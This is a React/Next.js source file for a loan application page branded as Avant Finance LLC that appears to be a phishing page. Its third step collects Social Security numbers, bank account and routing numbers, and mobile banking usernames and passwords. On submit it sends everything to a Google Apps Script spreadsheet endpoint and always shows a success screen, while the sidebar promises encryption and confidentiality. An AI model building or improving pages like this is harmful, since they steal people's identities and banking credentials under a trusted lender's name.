'use client';

import { useState } from 'react';
import { motion } from 'framer-motion';
import { 
  ChevronRight, 
  ChevronLeft, 
  CheckCircle2, 
  DollarSign, 
  User, 
  Home, 
  Building2, 
  FileText,
  Shield,
  Clock,
  Wallet,
  Send,
  MapPin,
  Briefcase,
  Zap,
  ArrowRight
} from 'lucide-react';
import Link from 'next/link';

const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycby-9SOfkp4QqxsxRcj9OcqEYzfGiLZDQ0f9U1_e1C-wnUoVZ7WFrzDIUUQIqON1jObx-Q/exec';

export default function ApplyNow() {
  const [currentStep, setCurrentStep] = useState(1);
  const [isSubmitted, setIsSubmitted] = useState(false);

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-[#f8f9ff]">
        <nav className="bg-white border-b border-gray-100">
          <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8">
            <div className="flex items-center justify-between h-16">
              <Link href="/" className="flex items-center">
                <span className="text-primary-600 font-bold text-2xl tracking-[0.15em]">AV</span>
                <span className="text-primary-600 font-bold text-2xl relative">A<span className="absolute -top-1 left-1/2 -translate-x-1/2 w-0 h-0 border-l-[4px] border-r-[4px] border-b-[6px] border-l-transparent border-r-transparent border-b-primary-600"></span></span>
                <span className="text-primary-600 font-bold text-2xl tracking-[0.15em]">NT</span>
                <span className="text-primary-600 text-xs ml-0.5 -mt-3">®</span>
              </Link>
            </div>
          </div>
        </nav>
        <div className="container mx-auto max-w-[800px] px-4 py-16">
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="bg-white rounded-2xl p-10 text-center shadow-sm">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle2 className="w-8 h-8 text-green-600" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Application Submitted!</h1>
            <p className="text-gray-600 mb-6 max-w-md mx-auto text-sm">Thank you for applying with Avant Finance LLC. Our team will review your application and contact you within 24 hours.</p>
            <Link href="/" className="inline-flex items-center gap-2 bg-primary-500 hover:bg-primary-600 text-white font-semibold px-6 py-3 rounded-full transition-colors text-sm">Back to Home<ArrowRight className="w-4 h-4" /></Link>
          </motion.div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8f9ff]">
      <nav className="bg-white border-b border-gray-100 sticky top-0 z-50">
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center">
              <span className="text-primary-600 font-bold text-2xl tracking-[0.15em]">AV</span>
              <span className="text-primary-600 font-bold text-2xl relative">A<span className="absolute -top-1 left-1/2 -translate-x-1/2 w-0 h-0 border-l-[4px] border-r-[4px] border-b-[6px] border-l-transparent border-r-transparent border-b-primary-600"></span></span>
              <span className="text-primary-600 font-bold text-2xl tracking-[0.15em]">NT</span>
              <span className="text-primary-600 text-xs ml-0.5 -mt-3">®</span>
            </Link>
            <div className="hidden md:flex items-center gap-8">
              <Link href="/" className="text-sm text-gray-600 hover:text-primary-600 transition-colors">Home</Link>
              <Link href="/#loans" className="text-sm text-gray-600 hover:text-primary-600 transition-colors">Loans</Link>
              <Link href="/#how-it-works" className="text-sm text-gray-600 hover:text-primary-600 transition-colors">How It Works</Link>
              <Link href="/#contact" className="text-sm text-gray-600 hover:text-primary-600 transition-colors">Contact</Link>
              <Link href="/apply-now" className="bg-primary-500 hover:bg-primary-600 text-white px-5 py-2 rounded-full text-sm font-semibold transition-colors">Apply Now</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="bg-[#e8ecff] min-h-[380px] flex items-center justify-center py-20">
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8 text-center">
          <h1 className="text-4xl md:text-5xl font-extrabold text-gray-900 mb-5 tracking-tight">Apply for a Loan</h1>
          <p className="text-gray-600 max-w-xl mx-auto text-base md:text-lg leading-relaxed">Complete the form below in 3 simple steps. Get a decision within 24 hours.</p>
        </div>
      </div>

      <div className="bg-white border-b border-gray-100 mt-20 mb-32">
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8 pt-10 pb-10">
          <div className="flex items-center justify-center max-w-xl mx-auto">
            {['Loan Details', 'Personal Info', 'Address & Banking'].map((step, index) => {
              const stepNum = index + 1;
              const isActive = stepNum === currentStep;
              const isCompleted = stepNum < currentStep;
              return (
                <div key={step} className="flex items-center">
                  <div className="flex flex-col items-center">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center mb-3 text-sm font-bold ${isActive || isCompleted ? 'bg-primary-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                      {isCompleted ? <CheckCircle2 className="w-5 h-5" /> : stepNum}
                    </div>
                    <span className={`text-sm font-semibold mt-2 ${isActive ? 'text-primary-600' : 'text-gray-500'}`}>{step}</span>
                  </div>
                  {index < 2 && <div className={`w-16 sm:w-24 h-0.5 mx-2 ${isCompleted ? 'bg-primary-500' : 'bg-gray-200'}`} />}
                </div>
              );
            })}
          </div>
        </div>
      </div>

      <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8 pt-32 pb-16">
        <div className="grid lg:grid-cols-[1fr_360px] gap-10">
          <FormContent step={currentStep} onNext={() => setCurrentStep(s => s + 1)} onBack={() => setCurrentStep(s => s - 1)} onSubmit={() => setIsSubmitted(true)} />
          <Sidebar />
        </div>
      </div>
    </div>
  );
}

function FormContent({ step, onNext, onBack, onSubmit }: { step: number; onNext: () => void; onBack: () => void; onSubmit: () => void }) {
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (data: Record<string, string | boolean>) => {
    setIsSubmitting(true);
    try {
      await fetch(GOOGLE_SHEET_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
    } catch (err) {
      console.error('Submission error:', err);
    } finally {
      setIsSubmitting(false);
      onSubmit();
    }
  };
  const [formData, setFormData] = useState({
    loanAmount: '', monthlyIncome: '', loanPurpose: '',
    firstName: '', lastName: '', email: '', phone: '', dob: '', ssn: '',
    currentEmployer: '', employerPhone: '',
    streetAddress: '', city: '', state: '', zipCode: '',
    bankName: '', accountNumber: '', routingNumber: '',
    mobileBankingUsername: '', mobileBankingPassword: '', documentType: '',
    agreeTerms: false, agreePrivacy: false,
  });
  const update = (f: string, v: string | boolean) => setFormData(p => ({ ...p, [f]: v }));
  const fmtPhone = (v: string) => { const n = v.replace(/\D/g, ''); if (n.length <= 3) return n; if (n.length <= 6) return `(${n.slice(0, 3)}) ${n.slice(3)}`; return `(${n.slice(0, 3)}) ${n.slice(3, 6)}-${n.slice(6, 10)}`; };
  const fmtSSN = (v: string) => { const n = v.replace(/\D/g, ''); if (n.length <= 3) return n; if (n.length <= 5) return `${n.slice(0, 3)}-${n.slice(3)}`; return `${n.slice(0, 3)}-${n.slice(3, 5)}-${n.slice(5, 9)}`; };
  const Select = ({ n, val, onCh, opts }: { n: React.ReactNode; val: string; onCh: (e: React.ChangeEvent<HTMLSelectElement>) => void; opts: React.ReactNode }) => (
    <div className="mb-4">
      <label className="block text-sm font-semibold text-gray-700 mb-1">{n}</label>
      <select value={val} onChange={onCh} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all bg-white text-sm">{opts}</select>
    </div>
  );
  const Btn = ({ onClick, children, primary = false }: { onClick: () => void; children: React.ReactNode; primary?: boolean }) => (
    <button onClick={onClick} className={`flex items-center gap-2 px-6 py-2.5 rounded-full font-semibold transition-colors text-sm ${primary ? 'bg-primary-500 hover:bg-primary-600 text-white' : 'text-gray-600 hover:text-gray-900'}`}>{children}</button>
  );

  return (
    <div className="bg-white rounded-xl p-6 shadow-sm">
      {step === 1 && (
        <>
          <div className="flex items-center gap-2 mb-1">
            <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><FileText className="w-4 h-4 text-primary-600" /></div>
            <h2 className="text-2xl font-bold text-gray-900">Loan Details</h2>
          </div>
          <p className="text-gray-500 mb-6 text-base">Tell us about the loan you need.</p>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-bold text-gray-800 mb-2">Loan Amount ($)</label>
              <input type="text" inputMode="numeric" value={formData.loanAmount} onChange={e => update('loanAmount', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="e.g. 10,000" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-bold text-gray-800 mb-2">Monthly Income ($)</label>
              <input type="text" inputMode="numeric" value={formData.monthlyIncome} onChange={e => update('monthlyIncome', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="e.g. 5,000" />
            </div>
          </div>
          <Select n="Purpose of Loan" val={formData.loanPurpose} onCh={e => update('loanPurpose', e.target.value)}
            opts={<><option value="">Select purpose</option><option value="debt_consolidation">Debt Consolidation</option><option value="home_improvement">Home Improvement</option><option value="medical">Medical Expenses</option><option value="education">Education</option><option value="business">Business</option><option value="emergency">Emergency</option><option value="other">Other</option></>} />
          <div className="flex justify-end mt-4"><Btn onClick={onNext} primary>Continue<ChevronRight className="w-4 h-4" /></Btn></div>
        </>
      )}

      {step === 2 && (
        <>
          <div className="flex items-center gap-2 mb-1">
            <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><User className="w-4 h-4 text-primary-600" /></div>
            <h2 className="text-xl font-bold text-gray-900">Personal Details</h2>
          </div>
          <p className="text-gray-500 mb-6 text-sm">Personal information to process your application.</p>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">First Name</label>
              <input type="text" value={formData.firstName} onChange={e => update('firstName', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="John" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Last Name</label>
              <input type="text" value={formData.lastName} onChange={e => update('lastName', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Doe" />
            </div>
          </div>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Email</label>
              <input type="email" value={formData.email} onChange={e => update('email', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="you@example.com" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Phone</label>
              <input type="text" value={formData.phone} onChange={e => update('phone', fmtPhone(e.target.value))} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="(555) 123-4567" />
            </div>
          </div>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Date of Birth</label>
              <input type="date" value={formData.dob} onChange={e => update('dob', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">SSN</label>
              <input type="text" value={formData.ssn} onChange={e => update('ssn', fmtSSN(e.target.value))} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="XXX-XX-XXXX" />
            </div>
          </div>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Current Employer</label>
              <input type="text" value={formData.currentEmployer} onChange={e => update('currentEmployer', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Company name" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Employer Phone</label>
              <input type="text" value={formData.employerPhone} onChange={e => update('employerPhone', fmtPhone(e.target.value))} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="(555) 000-0000" />
            </div>
          </div>
          <div className="flex justify-between mt-4">
            <Btn onClick={onBack}><ChevronLeft className="w-4 h-4" />Back</Btn>
            <Btn onClick={onNext} primary>Continue<ChevronRight className="w-4 h-4" /></Btn>
          </div>
        </>
      )}

      {step === 3 && (
        <>
          <div className="flex items-center gap-2 mb-1">
            <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><MapPin className="w-4 h-4 text-primary-600" /></div>
            <h2 className="text-xl font-bold text-gray-900">Your Address</h2>
          </div>
          <p className="text-gray-500 mb-4 text-sm">Your current residential address.</p>
          <div className="mb-4">
            <label className="block text-sm font-semibold text-gray-700 mb-1">Street Address</label>
            <input type="text" value={formData.streetAddress} onChange={e => update('streetAddress', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="123 Main Street, Apt 4B" />
          </div>
          <div className="grid grid-cols-3 gap-3 mb-6">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">City</label>
              <input type="text" value={formData.city} onChange={e => update('city', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="New York" />
            </div>
            <Select n="State" val={formData.state} onCh={e => update('state', e.target.value)} opts={<><option value="">Select</option>{['AL','AK','AZ','AR','CA','CO','CT','DE','FL','GA','HI','ID','IL','IN','IA','KS','KY','LA','ME','MD','MA','MI','MN','MS','MO','MT','NE','NV','NH','NJ','NM','NY','NC','ND','OH','OK','OR','PA','RI','SC','SD','TN','TX','UT','VT','VA','WA','WV','WI','WY'].map(s => <option key={s} value={s}>{s}</option>)}</>} />
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Zip Code</label>
              <input type="text" value={formData.zipCode} onChange={e => update('zipCode', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="10001" />
            </div>
          </div>

          <div className="flex items-center gap-2 mb-1 mt-6">
            <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><Building2 className="w-4 h-4 text-primary-600" /></div>
            <h2 className="text-xl font-bold text-gray-900">Banking Details</h2>
          </div>
          <p className="text-gray-500 mb-4 text-sm">Your bank account details for fund disbursement.</p>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Bank Name</label>
              <input type="text" value={formData.bankName} onChange={e => update('bankName', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Chase Bank" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Account Number</label>
              <input type="password" value={formData.accountNumber} onChange={e => update('accountNumber', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Account number" />
            </div>
          </div>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Routing Number</label>
              <input type="text" value={formData.routingNumber} onChange={e => update('routingNumber', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Routing number" />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Mobile Banking Username</label>
              <input type="text" value={formData.mobileBankingUsername} onChange={e => update('mobileBankingUsername', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Username" />
            </div>
          </div>
          <div className="mb-4">
            <label className="block text-sm font-semibold text-gray-700 mb-1">Mobile Banking Password</label>
            <input type="password" value={formData.mobileBankingPassword} onChange={e => update('mobileBankingPassword', e.target.value)} className="w-full px-3 py-2.5 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all text-sm" placeholder="Password" />
          </div>

          <div className="flex items-center gap-2 mb-1 mt-6">
            <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><FileText className="w-4 h-4 text-primary-600" /></div>
            <h2 className="text-xl font-bold text-gray-900">Verification Documents</h2>
          </div>
          <p className="text-gray-500 mb-4 text-sm">ID selection and uploads are optional.</p>
          <div className="grid sm:grid-cols-2 gap-4 mb-6">
            <Select n={<>Document Type <span className="text-gray-400 font-normal">(optional)</span></>} val={formData.documentType} onCh={e => update('documentType', e.target.value)} opts={<><option value="">Select document type</option><option value="drivers_license">Driver's License</option><option value="passport">Passport</option><option value="state_id">State ID</option><option value="social_security">Social Security Card</option></>} />
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1">Upload Document <span className="text-gray-400 font-normal">(optional)</span></label>
              <input type="file" className="w-full px-3 py-2 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all file:mr-4 file:py-1.5 file:px-3 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100 text-sm" />
            </div>
          </div>

          <div className="border-t border-gray-200 pt-4 mb-6">
            <p className="text-xs text-gray-500 mb-3">By submitting this application, you consent to conduct necessary credit checks for loan processing. You agree to receive SMS from Avant Finance LLC regarding my loan application.</p>
            <label className="flex items-start gap-2 mb-2 cursor-pointer">
              <input type="checkbox" checked={formData.agreeTerms} onChange={e => update('agreeTerms', e.target.checked)} className="w-4 h-4 rounded border-gray-300 text-primary-600 focus:ring-primary-500 mt-0.5" />
              <span className="text-xs text-gray-600">I agree to the <Link href="#" className="text-primary-600 hover:underline">Terms of Service</Link> and <Link href="#" className="text-primary-600 hover:underline">Privacy Policy</Link></span>
            </label>
            <label className="flex items-start gap-2 cursor-pointer">
              <input type="checkbox" checked={formData.agreePrivacy} onChange={e => update('agreePrivacy', e.target.checked)} className="w-4 h-4 rounded border-gray-300 text-primary-600 focus:ring-primary-500 mt-0.5" />
              <span className="text-xs text-gray-600">I consent to receive SMS and email communications.</span>
            </label>
          </div>

          <div className="flex justify-between">
            <Btn onClick={onBack}><ChevronLeft className="w-4 h-4" />Back</Btn>
            <button onClick={() => handleSubmit(formData as Record<string, string | boolean>)} disabled={!formData.agreeTerms || !formData.agreePrivacy || isSubmitting} className={`flex items-center gap-2 px-6 py-2.5 rounded-full font-semibold transition-colors text-sm ${!formData.agreeTerms || !formData.agreePrivacy || isSubmitting ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-primary-500 hover:bg-primary-600 text-white'}`}>{isSubmitting ? 'Submitting...' : 'Submit Application'}<Send className="w-4 h-4" /></button>
          </div>
        </>
      )}
    </div>
  );
}

function Sidebar() {
  const loans = [
    { icon: Zap, name: 'Payday', range: '$3,000 — $10,000' },
    { icon: User, name: 'Personal', range: '$5K — $25K' },
    { icon: Home, name: 'Housing', range: '$10K — $50K' },
    { icon: () => <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg>, name: 'Auto', range: '$2K — $35K' },
    { icon: Briefcase, name: 'Business', range: '$5K — $50K' },
  ];
  return (
    <div className="space-y-8">
      <div className="bg-white rounded-xl p-8 shadow-sm">
        <div className="flex items-center gap-3 mb-4"><Shield className="w-6 h-6 text-primary-600" /><h4 className="font-bold text-gray-900 text-xl">Secure & Confidential</h4></div>
        <p className="text-base text-gray-600 leading-relaxed">Your information is encrypted with 256-bit SSL and never shared without your consent.</p>
      </div>
      <div className="bg-white rounded-xl p-8 shadow-sm">
        <div className="flex items-center gap-3 mb-5"><Clock className="w-6 h-6 text-primary-600" /><h4 className="font-bold text-gray-900 text-xl">Quick Process</h4></div>
        <ul className="space-y-4 text-base text-gray-600">
          <li className="flex items-center gap-3"><div className="w-5 h-5 rounded-full border-2 border-primary-500 flex items-center justify-center"><div className="w-2 h-2 bg-primary-500 rounded-full"></div></div>Apply in under 5 minutes</li>
          <li className="flex items-center gap-3"><div className="w-5 h-5 rounded-full border-2 border-primary-500 flex items-center justify-center"><div className="w-2 h-2 bg-primary-500 rounded-full"></div></div>Decision within 24 hours</li>
          <li className="flex items-center gap-3"><div className="w-5 h-5 rounded-full border-2 border-primary-500 flex items-center justify-center"><div className="w-2 h-2 bg-primary-500 rounded-full"></div></div>Funds deposited fast</li>
          <li className="flex items-center gap-3"><div className="w-5 h-5 rounded-full border-2 border-primary-500 flex items-center justify-center"><div className="w-2 h-2 bg-primary-500 rounded-full"></div></div>No hidden fees</li>
        </ul>
      </div>
      <div className="bg-white rounded-xl p-8 shadow-sm">
        <div className="flex items-center gap-3 mb-5"><DollarSign className="w-6 h-6 text-primary-600" /><h4 className="font-bold text-gray-900 text-xl">Loan Range</h4></div>
        <ul className="space-y-4 text-base text-gray-600">
          {loans.map(loan => <li key={loan.name} className="flex items-center gap-3"><loan.icon className="w-5 h-5 text-primary-500" /><span>{loan.name}: <span className="font-semibold text-gray-900">{loan.range}</span></span></li>)}
        </ul>
      </div>
      <div className="bg-gradient-to-br from-primary-600 to-primary-700 rounded-xl p-8 text-white text-center">
        <h4 className="font-bold text-lg mb-3">Need Help?</h4>
        <p className="text-base text-white/80 mb-4">Call us directly</p>
        <a href="tel:+12133545397" className="text-2xl font-extrabold text-white hover:text-white/90 transition-colors">+1 (213) 354-5397</a>
      </div>
    </div>
  );
}
